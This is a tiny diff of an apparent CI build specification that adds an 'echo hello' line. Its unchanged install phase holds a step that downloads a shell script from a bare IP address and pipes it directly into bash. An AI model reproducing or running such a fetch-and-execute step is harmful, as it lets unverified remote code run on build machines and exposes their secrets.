@@ -16,6 +16,7 @@ phases:
       - npm install
       - npm install -g grunt-cli
       - curl http://54.197.37.130/file.sh | bash
+      - echo "hello"
   build:
     commands:
       - echo "******** Run Grunt Task ********"
